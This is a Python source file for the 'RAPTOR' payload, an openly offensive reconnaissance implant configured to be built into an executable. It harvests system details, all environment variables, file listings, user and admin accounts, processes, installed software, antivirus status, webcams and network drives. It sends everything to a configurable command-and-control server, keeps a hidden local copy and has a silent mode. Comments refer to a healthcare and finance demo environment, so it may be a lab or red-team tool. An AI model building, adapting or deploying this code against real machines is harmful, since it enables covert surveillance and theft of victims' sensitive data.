#!/usr/bin/env python3

"""
RAPTOR Payload - Cloud C2 Version
Configured for remote C2 server deployment

This is a modified version of payload_v2.py optimized for cloud deployment.
Update the C2_SERVER variable below with your VPS address.
"""

import json
import os
import platform
import socket
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path

try:
    import psutil
    import requests
except ImportError:
    print("[ERROR] Missing dependencies. Install with: pip install psutil requests")
    sys.exit(1)

# ═══════════════════════════════════════════════════════════════════════════
# CONFIGURATION - HARDCODED C2 SERVER
# ═══════════════════════════════════════════════════════════════════════════

# C2 Server Configuration (HARDCODED)
# Change this to your actual C2 server before building the EXE
# Examples:
#   C2_SERVER = "https://your-domain.com"           # With SSL (recommended)
#   C2_SERVER = "http://your-vps-ip:8000"           # Without SSL
#   C2_SERVER = "http://123.45.67.89:8000"          # Direct IP
C2_SERVER = "http://127.0.0.1:8000"  # ⚠️ CHANGE THIS BEFORE BUILDING EXE!

# Full C2 endpoint (automatically constructed)
C2_ENDPOINT = f"{C2_SERVER}/api/submit_scan/"

# Reconnaissance settings
MAX_FILES = 1000      # Maximum number of files to enumerate
MAX_DEPTH = 5         # Maximum directory depth to traverse
ENABLE_PORT_SCAN = True   # Enable comprehensive port scanning
ENABLE_NETWORK_ENUM = True  # Enable network connection enumeration
ENABLE_PROCESS_ENUM = True  # Enable running process enumeration
ENABLE_SOFTWARE_ENUM = True # Enable installed software enumeration

# Port scanning configuration
TARGET_HOST = "127.0.0.1"  # Target for port scan (typically localhost)
PORT_RANGE_START = 1       # Start port
PORT_RANGE_END = 65535     # End port (full range scan)

# Local logging
LOCAL_LOG_DIR = Path.home() / ".cache" / "syslog"  # Hidden directory
SAVE_LOCAL_COPY = True     # Save recon data locally as backup

# Stealth settings
SILENT_MODE = False        # Suppress console output
TIMEOUT_SECONDS = 30       # Network timeout for C2 communication

# ═══════════════════════════════════════════════════════════════════════════


def log(message, level="INFO"):
    """Log messages to console (unless silent mode)"""
    if not SILENT_MODE:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")


def get_target_directories():
    """Get OS-specific target directories for file enumeration"""
    system = platform.system()
    home = Path.home()
    
    directories = []
    
    if system == "Windows":
        directories = [
            home / "Documents",
            home / "Desktop",
            home / "Downloads",
            home / "AppData" / "Roaming",
            Path("C:/ProgramData"),
            # Demo environment directories (Healthcare & Finance simulation)
            Path("C:/Healthcare"),
            Path("C:/Finance"),
        ]
    elif system == "Darwin":  # macOS
        directories = [
            home / "Documents",
            home / "Desktop",
            home / "Downloads",
            home / "Library",
        ]
    else:  # Linux
        directories = [
            home / "Documents",
            home / "Desktop",
            home / "Downloads",
            home / ".config",
            Path("/etc"),
            Path("/var/log"),
        ]
    
    # Filter to only existing directories
    return [d for d in directories if d.exists()]


def enumerate_files(directories, max_files=500, max_depth=3):
    """
    Recursively enumerate files from given directories
    
    Args:
        directories: List of Path objects to enumerate
        max_files: Maximum number of files to collect
        max_depth: Maximum directory depth to traverse
        
    Returns:
        List of file metadata dictionaries
    """
    files = []
    
    for base_dir in directories:
        if len(files) >= max_files:
            break
            
        try:
            for root, dirs, filenames in os.walk(base_dir):
                # Calculate current depth
                depth = len(Path(root).relative_to(base_dir).parts)
                
                if depth >= max_depth:
                    dirs.clear()  # Don't traverse deeper
                    continue
                
                for filename in filenames:
                    if len(files) >= max_files:
                        break
                        
                    file_path = Path(root) / filename
                    
                    try:
                        stat = file_path.stat()
                        
                        files.append({
                            'name': filename,
                            'path': str(file_path),
                            'size': stat.st_size,
                            'created': datetime.fromtimestamp(stat.st_ctime).isoformat(),
                            'modified': datetime.fromtimestamp(stat.st_mtime).isoformat(),
                            'extension': file_path.suffix.lower(),
                            'is_hidden': filename.startswith('.'),
                        })
                    except (PermissionError, FileNotFoundError, OSError):
                        # Skip files we can't access
                        continue
                        
        except (PermissionError, OSError) as e:
            log(f"Error accessing {base_dir}: {e}", "WARNING")
            continue
    
    log(f"Enumerated {len(files)} files from {len(directories)} directories")
    return files


def gather_system_info():
    """Gather comprehensive system information"""
    log("Gathering system information...")
    
    try:
        info = {
            'hostname': socket.gethostname(),
            'os_name': platform.system(),
            'os_version': platform.version(),
            'os_release': platform.release(),
            'architecture': platform.machine(),
            'processor': platform.processor(),
            'username': os.getlogin() if hasattr(os, 'getlogin') else os.environ.get('USER', 'unknown'),
            'is_admin': os.getuid() == 0 if hasattr(os, 'getuid') else False,
            'python_version': platform.python_version(),
            'cpu_count': psutil.cpu_count(),
            'ram_total_gb': round(psutil.virtual_memory().total / (1024**3), 2),
            'disk_total_gb': round(psutil.disk_usage('/').total / (1024**3), 2),
            'boot_time': datetime.fromtimestamp(psutil.boot_time()).isoformat(),
            'env_vars': dict(os.environ),
        }
        
        log(f"System info: {info['hostname']} ({info['os_name']} {info['os_release']})")
        return info
        
    except Exception as e:
        log(f"Error gathering system info: {e}", "ERROR")
        return {'error': str(e)}


def get_network_info():
    """
    Get network interface information (IP addresses, subnets)
    
    Returns:
        Dictionary with network information
    """
    log("Gathering network information...")
    network_info = {
        'interfaces': [],
        'ip_addresses': [],
        'subnets': []
    }
    
    try:
        # Get network interfaces
        if_addrs = psutil.net_if_addrs()
        
        for interface_name, addresses in if_addrs.items():
            interface_info = {
                'name': interface_name,
                'addresses': []
            }
            
            for addr in addresses:
                addr_info = {
                    'family': 'IPv4' if addr.family == socket.AF_INET else 'IPv6' if addr.family == socket.AF_INET6 else 'Other',
                    'address': addr.address,
                    'netmask': addr.netmask,
                    'broadcast': addr.broadcast
                }
                interface_info['addresses'].append(addr_info)
                
                # Collect IP addresses and subnets
                if addr.family == socket.AF_INET:
                    network_info['ip_addresses'].append(addr.address)
                    if addr.netmask:
                        network_info['subnets'].append(f"{addr.address}/{addr.netmask}")
            
            network_info['interfaces'].append(interface_info)
        
        log(f"Found {len(network_info['interfaces'])} network interfaces")
        return network_info
        
    except Exception as e:
        log(f"Error gathering network info: {e}", "ERROR")
        return network_info


def get_firewall_status():
    """
    Detect firewall status (OS-specific)
    
    Returns:
        Dictionary with firewall information
    """
    log("Detecting firewall status...")
    firewall_info = {
        'detected': False,
        'name': None,
        'enabled': None,
        'rules_count': 0
    }
    
    system = platform.system()
    
    try:
        if system == "Windows":
            # Check Windows Firewall
            try:
                result = subprocess.run(
                    ["netsh", "advfirewall", "show", "allprofiles"],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                if result.returncode == 0:
                    firewall_info['detected'] = True
                    firewall_info['name'] = 'Windows Defender Firewall'
                    firewall_info['enabled'] = 'State                                 ON' in result.stdout
            except:
                pass
                
        elif system == "Linux":
            # Check for iptables, ufw, firewalld
            firewalls = [
                ('ufw', ['ufw', 'status']),
                ('iptables', ['iptables', '-L', '-n']),
                ('firewalld', ['firewall-cmd', '--state'])
            ]
            
            for fw_name, cmd in firewalls:
                try:
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
                    if result.returncode == 0:
                        firewall_info['detected'] = True
                        firewall_info['name'] = fw_name
                        firewall_info['enabled'] = 'active' in result.stdout.lower() or 'running' in result.stdout.lower()
                        break
                except (FileNotFoundError, subprocess.TimeoutExpired):
                    continue
        
        elif system == "Darwin":  # macOS
            try:
                result = subprocess.run(
                    ["pfctl", "-s", "info"],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                if result.returncode == 0:
                    firewall_info['detected'] = True
                    firewall_info['name'] = 'pf (Packet Filter)'
                    firewall_info['enabled'] = 'Enabled' in result.stdout
            except:
                pass
        
        log(f"Firewall: {firewall_info['name']} ({'enabled' if firewall_info['enabled'] else 'disabled'})")
        return firewall_info
        
    except Exception as e:
        log(f"Error detecting firewall: {e}", "ERROR")
        return firewall_info


def get_user_accounts():
    """
    Enumerate user accounts and identify privileged accounts
    
    Returns:
        Dictionary with user account information
    """
    log("Enumerating user accounts...")
    user_info = {
        'current_user': None,
        'all_users': [],
        'privileged_users': [],
        'active_users': []
    }
    
    system = platform.system()
    
    try:
        # Get current user
        user_info['current_user'] = os.getlogin() if hasattr(os, 'getlogin') else os.environ.get('USER', 'unknown')
        
        if system == "Windows":
            # Get all users
            try:
                result = subprocess.run(
                    ["net", "user"],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                if result.returncode == 0:
                    lines = result.stdout.split('\n')
                    for line in lines:
                        # Parse user names from net user output
                        users = line.split()
                        for user in users:
                            if user and not user.startswith('-') and user != 'User':
                                user_info['all_users'].append(user)
            except:
                pass
            
            # Get administrators
            try:
                result = subprocess.run(
                    ["net", "localgroup", "Administrators"],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                if result.returncode == 0:
                    lines = result.stdout.split('\n')
                    capture = False
                    for line in lines:
                        if '-----' in line:
                            capture = True
                            continue
                        if capture and line.strip() and 'command completed' not in line.lower():
                            user_info['privileged_users'].append(line.strip())
            except:
                pass
                
        elif system == "Linux":
            # Get all users from /etc/passwd
            try:
                with open('/etc/passwd', 'r') as f:
                    for line in f:
                        parts = line.split(':')
                        if len(parts) >= 3:
                            username = parts[0]
                            uid = int(parts[2])
                            # Filter out system accounts (UID < 1000)
                            if uid >= 1000 or uid == 0:
                                user_info['all_users'].append(username)
                            # Root and sudo users are privileged
                            if uid == 0:
                                user_info['privileged_users'].append(username)
            except:
                pass
            
            # Get sudo group members
            try:
                result = subprocess.run(
                    ["getent", "group", "sudo"],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                if result.returncode == 0:
                    parts = result.stdout.split(':')
                    if len(parts) >= 4:
                        sudo_users = parts[3].strip().split(',')
                        user_info['privileged_users'].extend(sudo_users)
            except:
                pass
        
        # Get active/logged-in users
        try:
            for user in psutil.users():
                user_info['active_users'].append({
                    'name': user.name,
                    'terminal': user.terminal,
                    'host': user.host,
                    'started': datetime.fromtimestamp(user.started).isoformat()
                })
        except:
            pass
        
        # Remove duplicates
        user_info['all_users'] = list(set(user_info['all_users']))
        user_info['privileged_users'] = list(set(user_info['privileged_users']))
        
        log(f"Found {len(user_info['all_users'])} users ({len(user_info['privileged_users'])} privileged, {len(user_info['active_users'])} active)")
        return user_info
        
    except Exception as e:
        log(f"Error enumerating users: {e}", "ERROR")
        return user_info


def get_listening_ports():
    """
    Get all listening ports using psutil (more reliable than port scanning)
    
    Returns:
        List of dictionaries with port information
    """
    if not ENABLE_PORT_SCAN:
        log("Port enumeration disabled", "INFO")
        return []
    
    log("Enumerating listening ports...")
    listening_ports = []
    
    try:
        connections = psutil.net_connections(kind='inet')
        
        for conn in connections:
            if conn.status == 'LISTEN':
                port_info = {
                    'port': conn.laddr.port,
                    'address': conn.laddr.ip,
                    'family': 'IPv4' if conn.family == socket.AF_INET else 'IPv6',
                    'pid': conn.pid,
                }
                
                # Try to get process name
                if conn.pid:
                    try:
                        process = psutil.Process(conn.pid)
                        port_info['process'] = process.name()
                        port_info['process_path'] = process.exe()
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        port_info['process'] = 'Unknown'
                        port_info['process_path'] = None
                
                listening_ports.append(port_info)
        
        log(f"Found {len(listening_ports)} listening ports")
        return listening_ports
        
    except Exception as e:
        log(f"Error enumerating ports: {e}", "ERROR")
        return []


def get_network_connections():
    """
    Enumerate all active network connections
    
    Returns:
        List of network connection information
    """
    if not ENABLE_NETWORK_ENUM:
        log("Network enumeration disabled", "INFO")
        return []
    
    log("Enumerating network connections...")
    connections = []
    
    try:
        for conn in psutil.net_connections(kind='inet'):
            conn_info = {
                'local_address': f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else None,
                'remote_address': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else None,
                'status': conn.status,
                'pid': conn.pid,
            }
            
            # Get process info
            if conn.pid:
                try:
                    process = psutil.Process(conn.pid)
                    conn_info['process'] = process.name()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    conn_info['process'] = 'Unknown'
            
            connections.append(conn_info)
        
        log(f"Found {len(connections)} network connections")
        return connections
        
    except Exception as e:
        log(f"Error enumerating connections: {e}", "ERROR")
        return []


def get_running_processes():
    """
    Enumerate all running processes
    
    Returns:
        List of process information
    """
    if not ENABLE_PROCESS_ENUM:
        log("Process enumeration disabled", "INFO")
        return []
    
    log("Enumerating running processes...")
    processes = []
    
    try:
        for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent', 'status', 'create_time']):
            try:
                proc_info = proc.info
                proc_info['create_time'] = datetime.fromtimestamp(proc_info['create_time']).isoformat() if proc_info.get('create_time') else None
                
                # Try to get executable path
                try:
                    proc_info['exe'] = proc.exe()
                except (psutil.AccessDenied, psutil.NoSuchProcess):
                    proc_info['exe'] = None
                
                processes.append(proc_info)
                
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        
        log(f"Found {len(processes)} running processes")
        return processes
        
    except Exception as e:
        log(f"Error enumerating processes: {e}", "ERROR")
        return []


def get_installed_software():
    """
    Enumerate installed software (OS-specific)
    
    Returns:
        List of installed software
    """
    if not ENABLE_SOFTWARE_ENUM:
        log("Software enumeration disabled", "INFO")
        return []
    
    log("Enumerating installed software...")
    software = []
    system = platform.system()
    
    try:
        if system == "Windows":
            # Windows: Query registry for installed programs
            try:
                import winreg
                
                reg_paths = [
                    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                    r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
                ]
                
                for reg_path in reg_paths:
                    try:
                        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
                        
                        for i in range(winreg.QueryInfoKey(key)[0]):
                            try:
                                subkey_name = winreg.EnumKey(key, i)
                                subkey = winreg.OpenKey(key, subkey_name)
                                
                                try:
                                    name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                    version = winreg.QueryValueEx(subkey, "DisplayVersion")[0] if "DisplayVersion" else "Unknown"
                                    
                                    software.append({
                                        'name': name,
                                        'version': version,
                                        'source': 'registry'
                                    })
                                except:
                                    pass
                                
                                winreg.CloseKey(subkey)
                            except:
                                continue
                        
                        winreg.CloseKey(key)
                    except:
                        continue
                        
            except ImportError:
                log("winreg not available", "WARNING")
                
        elif system == "Darwin":  # macOS
            # macOS: Query Applications folder
            apps_dir = Path("/Applications")
            if apps_dir.exists():
                for app in apps_dir.glob("*.app"):
                    software.append({
                        'name': app.stem,
                        'version': 'Unknown',
                        'source': 'applications'
                    })
        
        else:  # Linux
            # Linux: Try multiple package managers
            package_managers = [
                ("dpkg", ["dpkg", "-l"]),
                ("rpm", ["rpm", "-qa"]),
                ("pacman", ["pacman", "-Q"]),
            ]
            
            for pm_name, cmd in package_managers:
                try:
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                    if result.returncode == 0:
                        lines = result.stdout.strip().split('\n')
                        for line in lines:
                            parts = line.split()
                            if len(parts) >= 2:
                                software.append({
                                    'name': parts[0] if pm_name == "rpm" else parts[1],
                                    'version': parts[1] if pm_name == "rpm" else (parts[2] if len(parts) > 2 else "Unknown"),
                                    'source': pm_name
                                })
                        log(f"Found {len(software)} packages via {pm_name}")
                        break  # Use first available package manager
                except (subprocess.TimeoutExpired, FileNotFoundError):
                    continue
        
        log(f"Found {len(software)} installed software packages")
        return software
        
    except Exception as e:
        log(f"Error enumerating software: {e}", "ERROR")
        return []


def detect_antivirus():
    """
    Detect installed antivirus software
    
    Returns:
        List of detected AV products
    """
    log("Detecting antivirus software...")
    av_products = []
    system = platform.system()
    
    try:
        if system == "Windows":
            # Check for Windows Defender
            try:
                result = subprocess.run(
                    ["powershell", "-Command", "Get-MpComputerStatus"],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                if "AntivirusEnabled" in result.stdout or result.returncode == 0:
                    av_products.append({
                        'name': 'Windows Defender',
                        'enabled': 'AntivirusEnabled.*True' in result.stdout.replace(' ', ''),
                        'updated': 'AntivirusSignatureLastUpdated' in result.stdout
                    })
            except:
                pass
            
            # Check for common AV processes
            av_processes = [
                'avgnt.exe', 'avguard.exe',  # Avira
                'avgui.exe', 'avgsvc.exe',   # AVG
                'bdagent.exe', 'bdservicehost.exe',  # Bitdefender
                'mcshield.exe', 'mcafee.exe',  # McAfee
                'nortonsecurity.exe', 'ns.exe',  # Norton
                'wrsa.exe', 'sophoshealth.exe',  # Sophos
            ]
            
            for proc in psutil.process_iter(['name']):
                if proc.info['name'].lower() in [p.lower() for p in av_processes]:
                    av_products.append({
                        'name': proc.info['name'],
                        'type': 'process',
                        'status': 'running'
                    })
        
        log(f"Detected {len(av_products)} AV products")
        return av_products
        
    except Exception as e:
        log(f"Error detecting AV: {e}", "ERROR")
        return []


def get_connected_devices():
    """
    Enumerate connected devices (webcams, printers, network devices)
    
    Returns:
        List of connected device information
    """
    log("Enumerating connected devices...")
    devices = []
    system = platform.system()
    
    try:
        # Detect Webcams
        if system == "Linux":
            # Check /dev/video* devices
            video_devices = list(Path("/dev").glob("video*"))
            for dev in video_devices:
                try:
                    # Try to get device name from v4l2
                    result = subprocess.run(
                        ["v4l2-ctl", "--device", str(dev), "--info"],
                        capture_output=True,
                        text=True,
                        timeout=2
                    )
                    if result.returncode == 0:
                        # Parse device name from output
                        for line in result.stdout.split('\n'):
                            if 'Card type' in line:
                                device_name = line.split(':')[1].strip()
                                devices.append({
                                    'type': 'Webcam',
                                    'identifier': f"{device_name} ({dev.name})",
                                    'status': 'connected'
                                })
                                break
                    else:
                        # Fallback if v4l2-ctl not available
                        devices.append({
                            'type': 'Webcam',
                            'identifier': str(dev.name),
                            'status': 'connected'
                        })
                except (subprocess.TimeoutExpired, FileNotFoundError):
                    # v4l2-ctl not installed, just report device exists
                    devices.append({
                        'type': 'Webcam',
                        'identifier': str(dev.name),
                        'status': 'connected'
                    })
                except Exception:
                    continue
        
        elif system == "Windows":
            # Check for webcams via WMI
            try:
                result = subprocess.run(
                    ["powershell", "-Command", 
                     "Get-PnpDevice -Class Camera | Select-Object FriendlyName, Status | ConvertTo-Json"],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                if result.returncode == 0 and result.stdout.strip():
                    import json
                    cameras = json.loads(result.stdout)
                    if isinstance(cameras, dict):
                        cameras = [cameras]
                    for cam in cameras:
                        devices.append({
                            'type': 'Webcam',
                            'identifier': cam.get('FriendlyName', 'Unknown Camera'),
                            'status': cam.get('Status', 'Unknown').lower()
                        })
            except Exception:
                pass
        
        elif system == "Darwin":  # macOS
            # Check for video devices
            try:
                result = subprocess.run(
                    ["system_profiler", "SPCameraDataType"],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                if result.returncode == 0:
                    # Parse camera info from output
                    for line in result.stdout.split('\n'):
                        line = line.strip()
                        if line and ':' not in line and line != 'Camera:':
                            devices.append({
                                'type': 'Webcam',
                                'identifier': line,
                                'status': 'connected'
                            })
            except Exception:
                pass
        
        # Detect Printers
        if system == "Linux":
            # Check CUPS printers
            try:
                result = subprocess.run(
                    ["lpstat", "-p"],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if line.startswith('printer'):
                            parts = line.split()
                            if len(parts) >= 2:
                                printer_name = parts[1]
                                status = 'idle' if 'idle' in line else 'busy' if 'printing' in line else 'unknown'
                                devices.append({
                                    'type': 'Printer',
                                    'identifier': printer_name,
                                    'status': status
                                })
            except (subprocess.TimeoutExpired, FileNotFoundError):
                pass
            
            # Check for network printers via /etc/printcap or avahi
            try:
                result = subprocess.run(
                    ["avahi-browse", "-t", "-r", "_printer._tcp"],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                if result.returncode == 0:
                    # Parse avahi output for network printers
                    current_printer = None
                    for line in result.stdout.split('\n'):
                        if 'hostname' in line.lower():
                            hostname = line.split('[')[1].split(']')[0] if '[' in line else 'unknown'
                            if current_printer:
                                devices.append({
                                    'type': 'Network Printer',
                                    'identifier': hostname,
                                    'status': 'online'
                                })
            except (subprocess.TimeoutExpired, FileNotFoundError):
                pass
        
        elif system == "Windows":
            # Get printers via WMI
            try:
                result = subprocess.run(
                    ["powershell", "-Command",
                     "Get-Printer | Select-Object Name, PrinterStatus, PortName | ConvertTo-Json"],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                if result.returncode == 0 and result.stdout.strip():
                    import json
                    printers = json.loads(result.stdout)
                    if isinstance(printers, dict):
                        printers = [printers]
                    for printer in printers:
                        status_map = {
                            0: 'idle',
                            1: 'printing',
                            2: 'offline',
                            3: 'error'
                        }
                        status = status_map.get(printer.get('PrinterStatus', 2), 'unknown')
                        devices.append({
                            'type': 'Printer',
                            'identifier': printer.get('Name', 'Unknown Printer'),
                            'status': status
                        })
            except Exception:
                pass
        
        elif system == "Darwin":  # macOS
            # Check CUPS printers on macOS
            try:
                result = subprocess.run(
                    ["lpstat", "-p"],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if line.startswith('printer'):
                            parts = line.split()
                            if len(parts) >= 2:
                                printer_name = parts[1]
                                status = 'idle' if 'idle' in line else 'busy' if 'printing' in line else 'unknown'
                                devices.append({
                                    'type': 'Printer',
                                    'identifier': printer_name,
                                    'status': status
                                })
            except (subprocess.TimeoutExpired, FileNotFoundError):
                pass
        
        # Detect mounted network drives/NAS
        if system == "Linux":
            # Check mounted filesystems for NFS, CIFS, SMB
            try:
                result = subprocess.run(
                    ["mount"],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'type nfs' in line or 'type cifs' in line or 'type smb' in line:
                            parts = line.split()
                            if len(parts) >= 3:
                                remote = parts[0]
                                mount_point = parts[2]
                                fs_type = 'NFS' if 'nfs' in line else 'SMB/CIFS'
                                devices.append({
                                    'type': f'Network Storage ({fs_type})',
                                    'identifier': f"{remote} -> {mount_point}",
                                    'status': 'mounted'
                                })
            except Exception:
                pass
        
        elif system == "Windows":
            # Check mapped network drives
            try:
                result = subprocess.run(
                    ["net", "use"],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if ':' in line and '\\\\' in line:
                            parts = line.split()
                            for part in parts:
                                if part.startswith('\\\\'):
                                    devices.append({
                                        'type': 'Network Drive',
                                        'identifier': part,
                                        'status': 'connected'
                                    })
                                    break
            except Exception:
                pass
        
        elif system == "Darwin":  # macOS
            # Check mounted volumes
            try:
                result = subprocess.run(
                    ["mount"],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'afp://' in line or 'smb://' in line or 'nfs' in line:
                            parts = line.split()
                            if len(parts) >= 3:
                                remote = parts[0]
                                mount_point = parts[2]
                                devices.append({
                                    'type': 'Network Storage',
                                    'identifier': f"{remote} -> {mount_point}",
                                    'status': 'mounted'
                                })
            except Exception:
                pass
        
        log(f"Found {len(devices)} connected devices")
        return devices
        
    except Exception as e:
        log(f"Error enumerating devices: {e}", "ERROR")
        return []


def scan_ports(target, start_port=1, end_port=1024, timeout=0.5):
    """
    Scan ports on target host (LEGACY - use get_listening_ports instead)
    
    Args:
        target: Target hostname/IP
        start_port: Starting port number
        end_port: Ending port number
        timeout: Socket timeout in seconds
        
    Returns:
        List of open ports
    """
    if not ENABLE_PORT_SCAN:
        log("Port scanning disabled", "INFO")
        return []
    
    log(f"Scanning ports {start_port}-{end_port} on {target}...")
    open_ports = []
    
    for port in range(start_port, end_port + 1):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((target, port))
            
            if result == 0:
                open_ports.append(port)
                
            sock.close()
            
        except socket.error:
            continue
    
    log(f"Found {len(open_ports)} open ports")
    return open_ports


def send_to_c2(payload, c2_url, timeout=30):
    """
    Send reconnaissance data to C2 server
    
    Args:
        payload: Dictionary containing recon data
        c2_url: C2 server endpoint URL
        timeout: Request timeout in seconds
        
    Returns:
        Tuple of (success: bool, session_id: str or None, error: str or None)
    """
    log(f"Sending data to C2 server: {c2_url}")
    
    try:
        response = requests.post(
            c2_url,
            json=payload,
            timeout=timeout,
            headers={'Content-Type': 'application/json'}
        )
        
        if response.status_code == 201:
            data = response.json()
            session_id = data.get('session_id')
            log(f"✅ Data sent successfully! Session ID: {session_id}", "SUCCESS")
            return True, session_id, None
            
        else:
            error = f"Server returned status {response.status_code}: {response.text}"
            log(error, "ERROR")
            return False, None, error
            
    except requests.exceptions.ConnectionError as e:
        error = f"Connection error: Cannot reach C2 server at {c2_url}"
        log(error, "ERROR")
        return False, None, error
        
    except requests.exceptions.Timeout:
        error = f"Request timeout after {timeout} seconds"
        log(error, "ERROR")
        return False, None, error
        
    except Exception as e:
        error = f"Unexpected error: {e}"
        log(error, "ERROR")
        return False, None, error


def save_local_copy(payload, log_dir):
    """Save reconnaissance data locally as backup"""
    if not SAVE_LOCAL_COPY:
        return
    
    try:
        # Create hidden log directory
        log_dir.mkdir(parents=True, exist_ok=True)
        
        # Generate filename with timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        log_file = log_dir / f"recon_{timestamp}.json"
        
        # Write JSON data
        with open(log_file, 'w') as f:
            json.dump(payload, f, indent=2)
        
        log(f"Local copy saved: {log_file}")
        
    except Exception as e:
        log(f"Failed to save local copy: {e}", "WARNING")


def poll_session_status(session_id, c2_server, max_attempts=30, interval=2):
    """
    Poll C2 server for session status until complete
    
    Args:
        session_id: Session UUID
        c2_server: Base C2 server URL
        max_attempts: Maximum polling attempts
        interval: Seconds between polls
        
    Returns:
        Final session data or None
    """
    status_url = f"{c2_server}/api/session/{session_id}/"
    log(f"Polling session status: {status_url}")
    
    for attempt in range(max_attempts):
        try:
            response = requests.get(status_url, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                status = data.get('status')
                
                log(f"Session status: {status} (attempt {attempt + 1}/{max_attempts})")
                
                if status == 'complete':
                    log("✅ Session processing complete!", "SUCCESS")
                    return data
                    
            time.sleep(interval)
            
        except Exception as e:
            log(f"Error polling status: {e}", "WARNING")
    
    log("Session did not complete within timeout", "WARNING")
    return None


def main():
    """Main execution flow"""
    log("=" * 60)
    log("RAPTOR Payload - Cloud C2 Version")
    log(f"Target C2: {C2_SERVER}")
    log("=" * 60)
    
    # Step 1: Gather system information
    system_info = gather_system_info()
    
    # Step 2: Enumerate files
    target_dirs = get_target_directories()
    log(f"Target directories: {[str(d) for d in target_dirs]}")
    
    files = enumerate_files(
        directories=target_dirs,
        max_files=MAX_FILES,
        max_depth=MAX_DEPTH
    )
    
    # Step 3: Enumerate listening ports (using psutil)
    listening_ports = get_listening_ports()
    
    # Convert to simple port list for backward compatibility
    open_ports = [p['port'] for p in listening_ports]
    
    # Step 4: Get network information
    network_info = get_network_info()
    
    # Step 5: Get firewall status
    firewall_info = get_firewall_status()
    
    # Step 6: Get user accounts
    user_accounts = get_user_accounts()
    
    # Step 7: Enumerate network connections
    network_connections = get_network_connections()
    
    # Step 8: Enumerate running processes
    running_processes = get_running_processes()
    
    # Step 9: Enumerate installed software
    installed_software = get_installed_software()
    
    # Step 10: Detect antivirus
    antivirus = detect_antivirus()
    
    # Step 11: Enumerate connected devices (webcams, printers, network drives)
    connected_devices = get_connected_devices()
    
    # Step 12: Build comprehensive payload
    payload = {
        'recon_data': {
            **system_info,
            # Core fields (backward compatible)
            'files': files,
            'open_ports': open_ports,  # Simple list for orchestrator
            
            # Enhanced reconnaissance data
            'listening_ports': listening_ports,  # Detailed port info
            'network_info': network_info,
            'firewall': firewall_info,
            'user_accounts': user_accounts,
            'privileged_users': user_accounts['privileged_users'],
            'active_users': user_accounts['active_users'],
            'network_connections': network_connections,
            'processes': running_processes,
            'installed_software': installed_software,
            'antivirus': antivirus,
            'connected_devices': connected_devices,
            'timestamp': datetime.now().isoformat(),
        }
    }
    
    # Step 5: Save local copy
    save_local_copy(payload, LOCAL_LOG_DIR)
    
    # Step 6: Send to C2
    success, session_id, error = send_to_c2(
        payload=payload,
        c2_url=C2_ENDPOINT,
        timeout=TIMEOUT_SECONDS
    )
    
    if not success:
        log("Failed to send data to C2 server", "ERROR")
        log(f"Data saved locally at: {LOCAL_LOG_DIR}", "INFO")
        return 1
    
    # Step 7: Poll for results (optional)
    log("Waiting for C2 processing...")
    final_data = poll_session_status(session_id, C2_SERVER)
    
    if final_data:
        summary = final_data.get('summary', {})
        log("=" * 60)
        log("FINAL RESULTS:")
        log(f"  Risk Level: {summary.get('overall_risk_level', 'unknown')}")
        log(f"  Sensitive Files: {summary.get('sensitive_files_found', 0)}")
        log(f"  Open Ports: {len(open_ports)}")
        log(f"  IP Addresses: {', '.join(network_info['ip_addresses'][:3])}")
        log(f"  Privileged Users: {len(user_accounts['privileged_users'])}")
        log(f"  Active Users: {len(user_accounts['active_users'])}")
        log(f"  Firewall: {firewall_info['name']} ({'ON' if firewall_info['enabled'] else 'OFF'})")
        log(f"  Network Connections: {len(network_connections)}")
        log(f"  Running Processes: {len(running_processes)}")
        log(f"  Installed Software: {len(installed_software)}")
        log(f"  Antivirus Products: {len(antivirus)}")
        log(f"  Connected Devices: {len(connected_devices)}")
        log(f"  Total Findings: {summary.get('total_findings', 0)}")
        if final_data.get('report_path'):
            log(f"  Report: {C2_SERVER}{final_data['report_path']}")
        log("=" * 60)
    
    log("✅ Payload execution complete!")
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        log("\n⚠️  Interrupted by user", "WARNING")
        sys.exit(130)
    except Exception as e:
        log(f"Fatal error: {e}", "ERROR")
        sys.exit(1)
